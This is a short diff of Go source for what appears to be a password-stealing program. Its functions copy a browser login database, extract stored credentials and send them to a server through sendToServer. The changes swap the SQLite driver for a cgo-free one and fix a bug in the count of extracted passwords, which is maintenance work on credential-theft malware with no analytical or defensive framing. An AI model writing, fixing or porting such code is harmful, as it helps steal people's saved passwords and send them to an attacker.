@@ -18,7 +18,7 @@ import (
 	"time"
 	"unsafe"
 
-	_ "github.com/mattn/go-sqlite3"
+	_ "modernc.org/sqlite"
 )
 
 const (
@@ -190,7 +190,7 @@ func stealPasswords() ([]Credential, error) {
 	log.Println("Successfully copied login data")
 	defer os.Remove(TEMP_DB_PATH)
 
-	db, err := sql.Open("sqlite3", TEMP_DB_PATH)
+	db, err := sql.Open("sqlite", TEMP_DB_PATH)
 	if err != nil {
 		log.Printf("Failed to open database: %v", err)
 		return nil, fmt.Errorf("failed to open database: %v", err)
@@ -293,7 +293,7 @@ func main() {
 		return
 	}
 	if len(credentials) > 0 {
-		fmt.Printf("Successfully extracted %d passwords\n", credentials)
+		fmt.Printf("Successfully extracted %d passwords\n", len(credentials))
 		if err := sendToServer(credentials); err != nil {
 			log.Printf("Failed to send to server: %v", err)
 		}
